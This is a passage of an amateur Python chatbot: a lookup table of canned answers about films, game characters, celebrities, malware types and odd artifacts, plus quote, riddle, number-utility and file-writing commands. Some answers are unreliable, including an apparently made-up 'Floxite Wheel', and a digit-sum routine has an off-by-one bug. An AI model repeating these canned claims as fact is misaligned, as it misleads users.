        }): "Some of the best movies of all time include The Shawshank Redemption, The Godfather, The Dark Knight, and Schindler's List, based on their cultural impact and critical acclaim.",

        frozenset({
            "best superhero movies",
            "top superhero films",
            "most popular superhero movies",
            "top comic book movies"
        }): "Some of the best superhero movies include Avengers: Endgame, The Dark Knight, Spider-Man: Into the Spider-Verse, and Iron Man, celebrated for their action and storytelling.",

        frozenset({
            "best horror movies",
            "top horror films",
            "scariest movies",
            "most terrifying horror films"
        }): "Top horror movies include The Exorcist, A Nightmare on Elm Street, Get Out, and The Conjuring, known for their chilling atmosphere and psychological thrills.",

        frozenset({
            "best animated movies",
            "top animated films",
            "most popular animated movies",
            "best animation movies"
        }): "Some of the best animated movies include The Lion King, Toy Story, Spirited Away, and Frozen, praised for their animation quality and storytelling.",

        frozenset({
            "best action movies",
            "top action films",
            "most popular action movies",
            "best action-packed movies"
        }): "Top action movies include Die Hard, Mad Max: Fury Road, The Dark Knight, and John Wick, known for their thrilling action sequences and intense pacing.",

        frozenset({
            "best rom-com movies",
            "top romantic comedy films",
            "most popular rom-com movies",
            "best romantic comedy films"
        }): "Popular romantic comedy movies include When Harry Met Sally, Notting Hill, 10 Things I Hate About You, and Crazy Rich Asians, loved for their humor and heartwarming moments.",

        frozenset({
            "best sci-fi movies",
            "top science fiction films",
            "most popular sci-fi movies",
            "best futuristic movies"
        }): "Top sci-fi movies include Blade Runner, The Matrix, Inception, and Interstellar, known for their mind-bending plots and futuristic themes.",

        frozenset({
            "best comedy movies",
            "top comedy films",
            "most popular comedy movies",
            "best funny movies"
        }): "Some of the best comedy movies include The Hangover, Superbad, Monty Python and the Holy Grail, and The Big Lebowski, loved for their humor and iconic moments.",

        frozenset({
            "best drama movies",
            "top drama films",
            "most popular drama movies",
            "best emotional movies"
        }): "Top drama movies include Forrest Gump, The Shawshank Redemption, A Beautiful Mind, and The Pursuit of Happyness, recognized for their emotional depth and powerful performances.",

        frozenset({
            "best thriller movies",
            "top thriller films",
            "most suspenseful movies",
            "best mystery thriller movies"
        }): "Top thriller movies include Se7en, Gone Girl, The Silence of the Lambs, and Prisoners, known for their tense atmosphere and shocking twists.",

        frozenset({
            "who is kratos", 
            "kratos character", 
            "kratos god of war", 
            "who is the kratos character", 
            "kratos in video games", 
            "who is the god of war character"
        }): "Kratos is the main character in the God of War series, created by Santa Monica Studio. He is a Spartan warrior who becomes the God of War, battling gods, mythological creatures, and confronting his tragic past.",

        frozenset({
            "who is claire redfield", 
            "claire redfield character", 
            "claire redfield in resident evil", 
            "who is the claire redfield character", 
            "claire redfield in the game", 
            "who is leon kennedy's partner claire"
        }): "Claire Redfield is a central character in the Resident Evil series, created by Capcom. She is the younger sister of Chris Redfield and a survivor of the Raccoon City incident, fighting against bioterrorism and various enemies.",

        frozenset({
            "who is chris redfield", 
            "chris redfield character", 
            "chris redfield in resident evil", 
            "who is the chris redfield character", 
            "chris redfield in the game", 
            "who is the leader of the BSAA"
        }): "Chris Redfield is a veteran character in the Resident Evil series, created by Capcom. He is a founding member of the BSAA (Bioterrorism Security Assessment Alliance) and a long-time protagonist known for his strength and courage in combating bioterrorism.",

        frozenset({
            "who is ashley graham", 
            "ashley graham character", 
            "ashley graham resident evil", 
            "who is the ashley graham character", 
            "ashley graham in the game", 
            "who is the girl in resident evil 4"
        }): "Ashley Graham is a character from Resident Evil 4. She is the daughter of the U.S. president, who is kidnapped, and Leon S. Kennedy is tasked with rescuing her during the game's events.",

        frozenset({
            "who is jill valentine", 
            "jill valentine character", 
            "jill valentine in resident evil", 
            "who is the jill valentine character", 
            "jill valentine in the game", 
            "who is the star member in resident evil"
        }): "Jill Valentine is a central character in the Resident Evil series. She is a founding member of the S.T.A.R.S. (Special Tactics and Rescue Service) team and plays a key role in the fight against the Umbrella Corporation's bioweapons.",

        frozenset({
            "who is agent 47", 
            "agent 47 character", 
            "agent 47 hitman", 
            "who is the agent 47 character", 
            "agent 47 in the game", 
            "who is the hitman in video games"
        }): "Agent 47 is the protagonist of the Hitman series, created by IO Interactive. He is a genetically engineered assassin known for his stealth and ability to eliminate targets in highly precise ways.",

        frozenset({
            "who is cloud strife", 
            "cloud strife character", 
            "cloud strife final fantasy", 
            "who is the cloud strife character", 
            "cloud strife in final fantasy 7", 
            "who is the protagonist in final fantasy 7"
        }): "Cloud Strife is the protagonist of Final Fantasy VII, created by Square Enix. He is a mercenary with a complex past, fighting against the megacorporation Shinra and the antagonist Sephiroth in the game's epic story.",

        frozenset({
            "who is pikachu", 
            "pikachu character", 
            "pikachu from pokemon", 
            "who is the pikachu character", 
            "pikachu in pokemon", 
            "who is the mascot of pokemon"
        }): "Pikachu is an Electric-type Pokémon and the mascot of the Pokémon franchise, created by Nintendo. It is known for its cuteness, loyalty to its trainer Ash Ketchum, and its iconic move, Thunderbolt.",

        frozenset({
            "who is donkey kong", 
            "donkey kong character", 
            "donkey kong in video games", 
            "who is the donkey kong character", 
            "donkey kong in the game", 
            "who is the ape in donkey kong"
        }): "Donkey Kong is a video game character created by Nintendo. He is a strong and intelligent ape who often battles enemies to protect his home and family, most notably in his own series of platforming games.",
        
        frozenset({
            "who is jiwoo",
            "who is jiwoo kpop",
            "who is jiwoo?",
            "about jiwoo"
        }): "Jiwoo is a South Korean singer and a member of the K-pop group NMIXX, known for her strong vocals and impressive performance skills. She debuted as a member of NMIXX under JYP Entertainment in 2022. Jiwoo has gained attention for her powerful stage presence and contribution to the group’s music, showcasing both her vocal talent and charisma.",
        frozenset({
            "who is lisa",
            "who is lisa blackpink",
            "who is lisa kpop",
            "who is about lisa"
        }): "Lisa (Lalisa Manoban) is a Thai rapper, singer, and dancer based in South Korea. She is a member of the K-pop girl group Blackpink.",

        frozenset({
            "who is rose",
            "who is rose blackpink",
            "who is rose kpop",
            "who is about rose"
        }): "Rosé (Roseanne Park) is a Korean-New Zealand singer based in South Korea. She is a member of the K-pop girl group Blackpink.",

        frozenset({
            "who is jennie kim",
            "who is jennie blackpink",
            "who is jennie kpop",
            "who is about jennie kim"
        }): "Jennie Kim, known mononymously as Jennie, is a South Korean singer and rapper. She is a member of the K-pop girl group Blackpink.",

        frozenset({
            "who is jisoo",
            "who is jisoo blackpink",
            "who is jisoo kpop",
            "who is about jisoo"
        }): "Kim Ji-soo, known mononymously as Jisoo, is a South Korean singer and actress. She is a member of the K-pop girl group Blackpink.",
        frozenset({
            "who is sullyoon",
            "who is sullyoon nmixx",
            "who is sullyoon kpop",
            "who is about sullyoon"
        }): "Seol Yoon-ah (설윤아), known professionally as Sullyoon (설윤), is a South Korean singer and dancer signed under JYP Entertainment. She is a member of the girl group NMIXX.",

        frozenset({
            "what is the oldest language in the world?",
            "what is the oldest language in the world",
            "oldest language in the world",
            "oldest language in the world?",
            "tell me what is the oldest language",
            "tell me what is the oldest language?",
            "what is oldest language in te world"
        }): "The oldest language in the world is hard to pinpoint, but two languages from India considered to be among the oldest are Sanskrit and Tamil.",

        frozenset({
            "who is tom holland",
            "who is tom holland?",
            "who is known about tom holland"
        }): "Tom Holland is a British actor, best known for his role as Spider-Man in the Marvel Cinematic Universe.",

        frozenset({
            "who is lil nas x", 
            "who is lil nas x songs", 
            "who is lil nas x old town road", 
            "who is about lil nas x"
        }): "Lil Nas X is an American rapper and singer known for his hit song 'Old Town Road'.",

        frozenset({
            "who is jay rock", 
            "who is jay rock music", 
            "who is jay rock top dawg", 
            "who is about jay rock"
        }): "Jay Rock is an American rapper signed to Top Dawg Entertainment.",

        frozenset({
            "who is lil bow wow", 
            "who is lil bow wow movies", 
            "who is lil bow wow music", 
            "who is about lil bow wow"
        }): "Lil Bow Wow (now known as Bow Wow) is an American rapper and actor.",

        frozenset({
            "who is metro boomin", 
            "who is metro boomin producer", 
            "who is metro boomin beats", 
            "who is about metro boomin"
        }): "Metro Boomin is an American record producer, songwriter, and DJ.",

        frozenset({
            "who is memphis cult", 
            "who is memphis cult music", 
            "who is memphis cult rap", 
            "who is about memphis cult"
        }): "Memphis Cult may refer to various artists or groups associated with the Memphis rap scene, often characterized by its dark and gritty sound. More context is needed for a specific answer.", #Added context as "Memphis Cult" is not a single widely recognized artist.

        frozenset({
            "who is ice cube", 
            "who is ice cube movies", 
            "who is ice cube nwa", 
            "who is about ice cube"
        }): "Ice Cube is an American rapper, actor, and filmmaker. He was a member of the hip-hop group N.W.A.",

        frozenset({
            "who is offset", 
            "who is offset migos", 
            "who is offset music", 
            "who is about offset"
        }): "Offset is an American rapper and a member of the hip-hop group Migos.",

        frozenset({
            "who is jid", 
            "who is jid rapper", 
            "who is jid music", 
            "who is about jid"
        }): "JID is an American rapper signed to J. Cole's Dreamville Records.",

        frozenset({
            "who is rema", 
            "who is rema songs", 
            "who is rema music", 
            "who is about rema"
        }): "Rema is a Nigerian singer and rapper known for his Afrobeat sound.",

        frozenset({
            "who is bruno mars", 
            "who is bruno mars songs", 
            "who is bruno mars music", 
            "who is about bruno mars"
        }): "Bruno Mars is an American singer, songwriter, dancer, and multi-instrumentalist.",

        frozenset({
            "who is saweetie", 
            "who is saweetie rapper", 
            "who is saweetie music", 
            "who is about saweetie"
        }): "Saweetie is an American rapper and songwriter.",

        frozenset({
            "who is kidi", 
            "who is kidi ghana", 
            "who is kidi music", 
            "who is about kidi"
        }): "KiDi is a Ghanaian highlife and Afrobeats singer-songwriter.",

        frozenset({
            "who is tulsi kumar", 
            "who is tulsi kumar songs", 
            "who is tulsi kumar music", 
            "who is about tulsi kumar"
        }): "Tulsi Kumar is an Indian playback singer.",

        frozenset({
            "who is pharell williams", 
            "who is pharell williams producer", 
            "who is pharell williams music", 
            "who is about pharell williams"
        }): "Pharrell Williams is an American singer, rapper, songwriter, and record producer.",

        frozenset({
            "who is tommy richman", 
            "who is tommy richman music", 
            "who is tommy richman singer", 
            "who is about tommy richman"
        }): "Tommy Richman is an American singer and songwriter.",

        frozenset({
            "who is tyler, the creator", 
            "who is tyler, the creator rapper", 
            "who is tyler, the creator music", 
            "who is about tyler, the creator"
        }): "Tyler, the Creator is an American rapper, singer, songwriter, record producer, and music video director.",

        frozenset({
            "who is usher", 
            "who is usher songs", 
            "who is usher music", 
            "who is about usher"
        }): "Usher is an American singer, songwriter, dancer, and actor.",

        frozenset({
            "who is tobey maguire",
            "who is tobey maguire?",
            "who is known about tobey maguire"
        }): "Tobey Maguire is an American actor and producer, most famous for portraying Spider-Man in Sam Raimi's Spider-Man trilogy.",

        frozenset({
            "who is zendaya",
            "who is zendaya?",
            "who is known about zendaya"
        }): "Zendaya is an American actress and singer, known for her roles in 'Spider-Man' films and the HBO series 'Euphoria'.",

        frozenset({
            "who is andrew garfield",
            "who is andrew garfield?",
            "who is known about andrew garfield"
        }): "Andrew Garfield is a British-American actor, best known for portraying Spider-Man in 'The Amazing Spider-Man' series.",

        frozenset({
            "who is jamie foxx",
            "who is jamie foxx?",
            "who is known about jamie foxx"
        }): "Jamie Foxx is an American actor, singer, and comedian, known for his roles in 'Ray' and 'Django Unchained'.",

        frozenset({
            "who is demi rose",
            "who is demi rose?",
            "who is known about demi rose"
        }): "Demi Rose is a British model and social media personality, famous for her curvaceous figure and presence on Instagram.",

        frozenset({
            "who is jacob batalon",
            "who is jacob batalon?",
            "who is known about jacob batalon"
        }): "Jacob Batalon is an American actor, known for playing Ned Leeds in the 'Spider-Man' MCU films.",

        frozenset({
            "who is angelina jolie",
            "who is angelina jolie?",
            "who is known about angelina jolie"
        }): "Angelina Jolie is an American actress, filmmaker, and humanitarian, known for her roles in 'Maleficent' and 'Lara Croft: Tomb Raider'.",

        frozenset({
            "who is britney spears",
            "who is britney spears?",
            "who is known about britney spears"
        }): "Britney Spears is an American singer, songwriter, and dancer, known for her pop hits like 'Baby One More Time' and 'Toxic'.",

        frozenset({
            "who is jim carrey",
            "who is jim carrey?",
            "who is known about jim carrey"
        }): "Jim Carrey is a Canadian-American actor and comedian, famous for his roles in 'The Mask', 'Ace Ventura', and 'The Truman Show'.",

        frozenset({
            "who is julia roberts",
            "who is julia roberts?",
            "who is known about julia roberts"
        }): "Julia Roberts is an American actress, known for her roles in 'Pretty Woman', 'Erin Brockovich', and 'My Best Friend's Wedding'.",

        frozenset({
            "who is nate dogg",
            "who is nate dogg?",
            "who is known about nate dogg"
        }): "Nate Dogg was an American singer, rapper, and songwriter, known for his smooth vocal style and collaborations with Snoop Dogg and Dr. Dre.",

        frozenset({
            "who is 50 cent",
            "who is 50 cent?",
            "who is known about 50 cent"
        }): "50 Cent is an American rapper, actor, and entrepreneur, known for his hit albums like 'Get Rich or Die Tryin' and his role in the show 'Power'.",

        frozenset({
            "who is kendrick lamar",
            "who is kendrick lamar?",
            "who is known about kendrick lamar"
        }): "Kendrick Lamar is an American rapper and songwriter, known for his critically acclaimed albums like 'To Pimp a Butterfly' and 'DAMN.'.",

        frozenset({
            "who is michael jordan",
            "who is michael jordan?",
            "who is known about michael jordan"
        }): "Michael Jordan is a retired American professional basketball player, widely regarded as the greatest of all time in the NBA.",

        frozenset({
            "who is jk rowling",
            "who is jk rowling?",
            "who is known about jk rowling"
        }): "J.K. Rowling is a British author, best known for writing the 'Harry Potter' series.",

        frozenset({
            "who is jayz",
            "who is jayz?",
            "who is known about jayz"
        }): "Jay-Z is an American rapper, entrepreneur, and music producer, known for his successful albums and his marriage to Beyoncé.",

        frozenset({
            "who is akon",
            "who is akon?",
            "who is known about akon"
        }): "Akon is a Senegalese-American singer, songwriter, and philanthropist, known for his hits like 'Lonely' and 'Smack That'.",

        frozenset({
            "who is dax",
            "who is dax?",
            "who is known about dax"
        }): "Dax is a Canadian rapper and songwriter, known for his viral songs and motivational lyrics.",

        frozenset({
            "who is destiny rogers",
            "who is destiny rogers?",
            "who is known about destiny rogers"
        }): "Destiny Rogers is an American singer and songwriter, known for her songs like 'Tomboy' and 'High Off You'.",

        frozenset({
            "who is danny brown",
            "who is danny brown?",
            "who is known about danny brown"
        }): "Danny Brown is an American rapper and songwriter, known for his experimental style and albums like 'XXX' and 'Atrocity Exhibition'.",

        frozenset({
            "who is jung kook",
            "who is jung kook?",
            "who is known about jung kook"
        }): "Jung Kook is a South Korean singer, best known as a member of the K-pop group BTS.",

        frozenset({
            "who is kim taeh yung",
            "who is kim taeh yung?",
            "who is known about kim taeh yung"
        }): "Kim Taehyung, also known as V, is a South Korean singer and member of BTS, known for his deep voice and emotional performances.",

        frozenset({
            "who is asap rocky",
            "who is asap rocky?",
            "who is known about asap rocky"
        }): "ASAP Rocky is an American rapper, songwriter, and record producer, known for his albums like 'Long.Live.A$AP' and 'Testing'.",

        frozenset({
            "who is desiigner",
            "who is desiigner?",
            "who is known about desiigner"
        }): "Desiigner is an American rapper, known for his hit song 'Panda' and his unique trap style.",

        frozenset({
            "who is 21 savage",
            "who is 21 savage?",
            "who is known about 21 savage"
        }): "21 Savage is a British-American rapper, known for his albums like 'Issa Album' and his deep voice and streetwise lyrics.",

        frozenset({
            "who is 2pac",
            "who is 2pac?",
            "who is known about 2pac"
        }): "2Pac, also known as Tupac Shakur, was an American rapper, actor, and activist, known for his impactful music and outspoken views on social issues.",

        frozenset({
            "who is sidhu moose wala",
            "who is sidhu moose wala?",
            "who is known about sidhu moose wala"
        }): "Sidhu Moosewala was an Indian singer, songwriter, and rapper, known for his Punjabi music and impactful lyrics.",

        frozenset({
            "who is ap dhillon",
            "who is ap dhillon?",
            "who is known about ap dhillon"
        }): "AP Dhillon is a British-Indian singer and songwriter, known for his hit tracks in the Punjabi music industry.",

        frozenset({
            "who is emiway bantai",
            "who is emiway bantai?",
            "who is known about emiway bantai"
        }): "Emiway Bantai is an Indian rapper, known for his Hindi and Marathi rap songs that have gained massive popularity.",

        frozenset({
            "who is shubh",
            "who is shubh?",
            "who is known about shubh"
        }): "Shubh is an Indian rapper and musician, known for his unique blend of hip hop and Punjabi music.",

        frozenset({
            "who is karan aujla",
            "who is karan aujla?",
            "who is known about karan aujla"
        }): "Karan Aujla is an Indian singer, lyricist, and composer, known for his Punjabi-language songs.",

        frozenset({
            "who is alia bhatt",
            "who is alia bhatt?",
            "who is known about alia bhatt"
        }): "Alia Bhatt is an Indian actress, known for her performances in Bollywood films like 'Raazi' and 'Gully Boy'.",

        frozenset({
            "who is disha patani",
            "who is disha patani?",
            "who is known about disha patani"
        }): "Disha Patani is an Indian actress, known for her roles in Bollywood films like 'Baaghi 2' and 'Malang'.",

        frozenset({
            "who is ananya panday",
            "who is ananya panday?",
            "who is known about ananya panday"
        }): "Ananya Panday is an Indian actress, known for her roles in films like 'Student of the Year 2' and 'Pati Patni Aur Woh'.",

        frozenset({
            "what is kylie jenner?",
            "what is kylie jenner",
            "what is known about kylie jenner"
        }): "Kylie Jenner is a media personality, socialite, and businesswoman. She gained fame through the reality TV show 'Keeping Up with the Kardashians' and later founded the cosmetics brand Kylie Cosmetics.",

        frozenset({
            "what is dr dre?",
            "what is dr dre",
            "what is known about dr dre"
        }): "Dr. Dre, born Andre Young, is a renowned American rapper, producer, and entrepreneur. He is a founding member of N.W.A. and the founder of Beats by Dre.",

        frozenset({
            "what is snoop dogg?",
            "what is snoop dogg",
            "what is known about snoop dogg"
        }): "Snoop Dogg, born Calvin Broadus Jr., is an American rapper, singer, and media personality. He is known for his laid-back style and hits like 'Gin and Juice.'",

        frozenset({
            "what is travis scott?",
            "what is travis scott",
            "what is known about travis scott"
        }): "Travis Scott, born Jacques Webster II, is an American rapper, singer, and producer. He is known for his energetic performances and collaborations with brands like Nike.",

        frozenset({
            "what is amitabh bachchan?",
            "what is amitabh bachchan",
            "what is known about amitabh bachchan"
        }): "Amitabh Bachchan is an Indian film actor, television host, and producer. He is regarded as one of the greatest and most influential actors in the history of Indian cinema.",

        frozenset({
            "what is lady gaga?",
            "what is lady gaga",
            "what is known about lady gaga"
        }): "Lady Gaga, born Stefani Germanotta, is an American singer, songwriter, and actress. She is known for her unconventionality and versatility in music, fashion, and performance.",

        frozenset({
            "what is taylor swift?",
            "what is taylor swift",
            "what is known about taylor swift"
        }): "Taylor Swift is an American singer-songwriter known for her narrative songwriting and versatility across genres. She has won multiple Grammy Awards and is one of the best-selling music artists.",

        frozenset({
            "what is kim kardashian?",
            "what is kim kardashian",
            "what is known about kim kardashian"
        }): "Kim Kardashian is an American media personality, socialite, and businesswoman. She gained fame through the reality TV show 'Keeping Up with the Kardashians' and has built a successful beauty and shapewear brand.",

        frozenset({
            "what is oprah winfrey?",
            "what is oprah winfrey",
            "what is known about oprah winfrey"
        }): "Oprah Winfrey is an American talk show host, television producer, and media proprietor. She is best known for 'The Oprah Winfrey Show' and is considered one of the most influential women in the world.",
            
        frozenset({
            "what is the antikythera mechanism?",
            "what is antikythera mechanism",
            "what is known about antikythera mechanism"
        }): "The Antikythera Mechanism is an ancient Greek analog device used to predict astronomical positions and eclipses. It is often regarded as the first known analog computer, dating back to around 100 BCE.",

        frozenset({
            "what is a virus",
            "what is virus",
            "define virus",
            "explain virus",
            "how does a virus work",
            "what does a virus do"
        }): "A virus is a type of malicious software that attaches itself to files or programs and activates when those files or programs are opened. It can corrupt, delete, or steal data.",

        frozenset({
            "what is ransomware",
            "define ransomware",
            "explain ransomware",
            "how does ransomware work",
            "what does ransomware do"
        }): "Ransomware is malicious software that encrypts files or locks the system, demanding ransom payment to unlock or decrypt the files. It may threaten to delete or expose data if the ransom isn't paid.",

        frozenset({
            "what is spyware",
            "define spyware",
            "explain spyware",
            "how does spyware work",
            "what does spyware do"
        }): "Spyware is a type of malware that secretly monitors user activity and steals sensitive information such as passwords, financial details, or browsing data. It is often used for identity theft or financial fraud.",

        frozenset({
            "what is a trojan",
            "what is trojan",
            "define trojan",
            "explain trojan",
            "how does a trojan work",
            "what does a trojan do"
        }): "A trojan is malware that disguises itself as legitimate software. Once installed, it performs malicious actions such as stealing data or creating backdoors for other malware.",

        frozenset({
            "what is a worm",
            "define worm",
            "explain worm",
            "what is worm",
            "how does a worm work",
            "what does a worm do"
        }): "A worm is a type of malware that replicates itself and spreads across networks and devices, consuming bandwidth or overloading servers in the process.",

        frozenset({
            "what is phishing",
            "define phishing",
            "explain phishing",
            "how does phishing work",
            "what does phishing do"
        }): "Phishing is a cyberattack that uses fake emails, messages, or websites to trick users into revealing personal information like passwords, credit card details, or social security numbers.",

        frozenset({
            "what is the dighton rock?",
            "what is dighton rock",
            "what is known about dighton rock"
        }): "Dighton Rock is a large boulder in Massachusetts, USA, which is covered in petroglyphs. The carvings are believed to be from various Native American tribes, though their meaning remains a mystery.",

        frozenset({
            "what is the crystal skull?",
            "what is crystal skull",
            "what is known about crystal skull"
        }): "The Crystal Skull is a term for a human-shaped skull carved from quartz crystal. Several such skulls have been found, but their origin, purpose, and the legends surrounding them are controversial and largely unexplained.",

        frozenset({
            "what is the floxite wheel?",
            "what is floxite wheel",
            "what is known about floxite wheel"
        }): "The Floxite Wheel is a mysterious object believed to have been discovered in an ancient tomb. It is often described as an unusual wheel-like device, though its purpose and significance are still unknown.",

        frozenset({
            "what is the charles leadbeater's telescope?",
            "what is charles leadbeater's telescope",
            "what is known about charles leadbeater's telescope"
        }): "Charles Leadbeater's telescope is said to be a device that allows the user to see objects beyond the physical spectrum. It is considered a mystical tool, with claims of seeing auras and hidden forces, but no scientific evidence supports its existence.",

        frozenset({
            "what is the london hammer?",
            "what is london hammer",
            "what is known about london hammer"
        }): "The London Hammer is a hammer encased in a rock formation, discovered in London, Texas. It is said to be over 100 million years old, raising questions about its origins and how it became encased in rock, but its authenticity is disputed.",

        frozenset({
            "what is the baghdad battery?",
            "what is baghdad battery",
            "what is known about baghdad battery"
        }): "The Baghdad Battery is an artifact that may have been used as a galvanic cell, capable of producing electricity. It dates back to around 250 BCE, but its exact function and use remain unknown.",

        frozenset({
            "what is the witch's hammer?",
            "what is witch's hammer",
            "what is known about witch's hammer"
        }): "The Witch's Hammer is an ancient tool, often linked to witchcraft and dark magic, believed to have been used in rituals. Its exact purpose and the methods employed in its use are shrouded in mystery, as it’s often mentioned in legends and folklore.",

        frozenset({
            "what is the flying machine of da vinci?",
            "what is flying machine of da vinci",
            "what is known about flying machine of da vinci"
        }): "Leonardo da Vinci’s flying machine is a conceptual design from the Renaissance period for a human-powered aircraft. While the device was never built in Da Vinci’s lifetime, it remains an iconic example of early aeronautical innovation.",

        frozenset({
            "what is the codex gigas?",
            "what is codex gigas",
            "what is known about codex gigas"
        }): "The Codex Gigas, also known as the 'Devil's Bible,' is a medieval manuscript that contains various texts, including the complete Bible. Its mysterious origins and illustrations, particularly a full-page depiction of the Devil, have contributed to numerous legends.",

        frozenset({
            "why is the sea blue?",
            "why sea is blue?",
            "why is the sea color blue?",
            "why is sea color blue?",
            "why sea color is blue?",
            "why is the sea blue",
            "why sea color is blue",
            "why sea is blue",
            "why is the sea color blue",
            "why sea color is blue",
        }): "The sea appears blue because water absorbs longer wavelengths of light (like red, yellow, and orange) more strongly than shorter wavelengths (like blue).",

        frozenset({
            "a famous meme",
            "a famous meme?",
            "tell me a famous meme",
            "can you tell me a meme?",
            "what is the most famous meme",
        }): "One of the famous MEME is Drake has been the subject of several different memes throughout his long career. His 2015 single “Hotline Bling” was one of the biggest songs of the year, and when the music video came out featuring Drake dancing in a brightly lit cube structure the memes began to accumulate even more. Since then the internet has memed everything from his Twitter posts to school",
        
        frozenset({
            "what does water taste like?",
            "what's the taste of water?",
            "what's the taste of water",
            "what is the water taste?",
            "what is the water taste",
            "what does water taste like",
            "water taste",
        }): "The taste of water can vary depending on its mineral content and treatment processes.",

        frozenset({
            "do fish get thirsty?",
            "do fish get thirsty",
        }): "Freshwater fish absorb water through their gills and do not drink. Marine fish drink seawater to filter out the salt."
    }

    # Attempt to find a matching response
    for question_set, response in question_responses.items():
        if ui in question_set:
            return response

    if "can you give me a quote?" in ui or "give me a quote" in ui or "a quote" in ui or "quote?" in ui or "can you give me a quote" in ui or "quote please" in ui or "-qte" in ui:
        import random
        quotes = [
                   "'The only way to do great work is to love what you do.' - Steve Jobs",
                   "'Success is not the key to happiness. Happiness is the key to success.' - Albert Schweitzer",
                   "'The best way to predict the future is to create it.' - Peter Drucker",
                   "'Great power comes with great responsibility.' - Uncle Ben",
                   "'Cultivation of mind should be the ultimate aim of human existence.' - B.R. Ambedkar",
                   "'The relationship between husband and wife should be one of closest friends.' - B.R. Ambedkar",
                   "'I measure the progress of a community by the degree of progress which women have achieved.' - B.R. Ambedkar",
                   "'The only limit to our realization of tomorrow will be our doubts of today.' - Franklin D. Roosevelt",
                   "'The worthy always fight the enemy, while the unworthy always fight their own.' - Hon. Kanshi Ram Ji",
                   "'The best preparation for tomorrow is doing your best today.' - H. Jackson Brown Jr.",
                   "'The future belongs to those who believe in the beauty of their dreams.' - Eleanor Roosevelt",
                   "'Success is not in what you have, but who you are.' - Bo Bennett",
                  ]
        selectedquote = random.choice(quotes)
        return (f"Sure! Here's a quote:{selectedquote}")
    elif "resident evil 2" in ui or "resident evil 3" in ui or "resident evil 4" in ui or "resident evil 2 remake" in ui or "resident evil 3 remake" in ui or "resident evil 4 remake"  in ui or "re2" in ui or "re3" in ui or "re4" in ui or "re2 remake" in ui or "re3 remake" in ui or "re4 remake" in ui:
        return "hmm i see you are Resident Evil Fan, right?"
    elif "-rid" in ui:  # Check if the command '-rid' is in the user's input
        import random
        riddles = [
            {"riddle": "What has keys but can't open locks?", "answer": ["a piano", "a keyboard", "a typewriter"]},
            {"riddle": "What has a head, a tail, is brown, and has no legs?", "answer": "a penny"},
            {"riddle": "What has a neck but no head?", "answer": "a bottle"},
            {"riddle": "What has a thumb and four fingers but is not alive?", "answer": "a glove"},
            {"riddle": "What has a heart that doesn't beat?", "answer": "an artichoke"},
            {"riddle": "What has a face and two hands but no arms or legs?", "answer": "a clock"},
            {"riddle": "What has a bed but never sleeps?", "answer": "a river"},
            {"riddle": "What has a bark but no bite?", "answer": "a tree"},
        ]
        
        selected_riddle = random.choice(riddles)
        print(selected_riddle["riddle"])  # Display the riddle
        user_answer = input("Your answer: ").strip().lower()

        if isinstance(selected_riddle["answer"], list):
            if user_answer in [answer.lower() for answer in selected_riddle["answer"]]:
                print("Correct! Well done.")
            else:
                print(f"Wrong! The correct answer is one of: {', '.join(selected_riddle['answer'])}")
        else:
            if user_answer == selected_riddle["answer"].lower():
                print("Correct! Well done.")
            else:
                print(f"Wrong! The correct answer is: {selected_riddle['answer']}")
        return "Well Played!"

    elif "-dga" in ui:
        print("---- DIGIT ANALYZER ----")
        def main():
                while True:
                    choice = input(
                        "1. Even/Odd Checker \n"
                        "2. Prime Number Checker \n"
                        "3. Factorial \n"
                        "4. Sum of Digits \n"
                        "5. Reverse a Number \n"
                        "6. Palindrome Checker \n"
                        "7. Convert to Binary \n"
                        "8. Exit \n"
                        "Choose(1/2/3/4/5/6/7/8): "
                    )

                    if choice == "1":
                        def even_odd(y):
                            if y % 2 == 0:
                                print(f"{y} is Even")
                            else:
                                print(f"{y} is Odd")

                        print("-----------------------------------")
                        try:
                            y = int(input("Enter any number to check Even/Odd: "))
                            even_odd(y)
                        except ValueError:
                            print("Invalid input! Please enter a numeric value.")
                        print("-----------------------------------")

                    elif choice == "2":
                        def is_prime(number):
                            if number < 2:
                                return False
                            for i in range(2, int(number ** 0.5) + 1):
                                if number % i == 0:
                                    return False
                            return True

                        print("----------------------------------------")
                        try:
                            num = int(input("Enter a number to check if it's Prime: "))
                            if is_prime(num):
                                print(f"{num} is a prime number.")
                            else:
                                print(f"{num} is not a prime number.")
                        except ValueError:
                            print("Invalid input! Please enter a numeric value.")
                        print("----------------------------------------")

                    elif choice == "3":
                        def factorial(y):
                            if y < 0:
                                return "Factorial is not defined for negative numbers."
                            if y == 0:
                                return 1
                            else:
                                return y * factorial(y - 1)

                        print("--------------------------------------")
                        try:
                            y = int(input("Enter any number to get its Factorial: "))
                            print(f"The factorial of {y} is {factorial(y)}")
                        except ValueError:
                            print("Invalid input! Please enter a numeric value.")
                        print("--------------------------------------")

                    elif choice == "4":
                        def sumnum(y):
                            if y == 0:
                                return 1
                            return y + sumnum(y - 1)

                        y = int(input("Enter Any Number for Sum: "))
                        print("-----------------------")
                        print(f"The Sum of {y} is: {sumnum(y)}")
                        print("-----------------------")

                    elif choice == "5":
                        def reverse_number(number):
                            return int(str(abs(number))[::-1]) * (-1 if number < 0 else 1)

                        print("--------------------------------------")
                        try:
                            num = int(input("Enter a number to reverse: "))
                            print(f"The reverse of {num} is {reverse_number(num)}")
                        except ValueError:
                            print("Invalid input! Please enter a numeric value.")
                        print("--------------------------------------")

                    elif choice == "6":
                        def is_palindrome(number):
                            number_str = str(abs(number))
                            return number_str == number_str[::-1]

                        print("--------------------------------------")
                        try:
                            num = int(input("Enter a number to check if it's a palindrome: "))
                            if is_palindrome(num):
                                print(f"{num} is a palindrome.")
                            else:
                                print(f"{num} is not a palindrome.")
                        except ValueError:
                            print("Invalid input! Please enter a numeric value.")
                        print("--------------------------------------")

                    elif choice == "7":
                        def to_binary(number):
                            return bin(number)[2:]

                        print("--------------------------------------")
                        try:
                            num = int(input("Enter a number to convert to binary: "))
                            print(f"The binary representation of {num} is {to_binary(num)}")
                        except ValueError:
                            print("Invalid input! Please enter a numeric value.")
                        print("--------------------------------------")

                    elif choice == "8":
                        print("Exited.")
                        break
                    else:
                        print("\nInvalid Choice!\n")
        if __name__ == "__main__":
                main()
                return "Thanks for using Digit Analyzer!"

    elif "-mkt" in ui: #txt file maker
            # print("\n           TXT FILE MAKER")
            print("------------------------------------------------------------------")
            Location = input("Enter location to create TXT file (e.g., path/of/folder/data.txt): ")           
            Text = input("Type texts to store in the TXT: ")
            with open(Location,"w") as file:
                file.write(Text)
            print("------------------------------------------------------------------")
            return "File Created Successfully!"
    
    elif "-calc" in ui or "calculator" in ui: #calculator
        print("----- CALCULATOR -----")
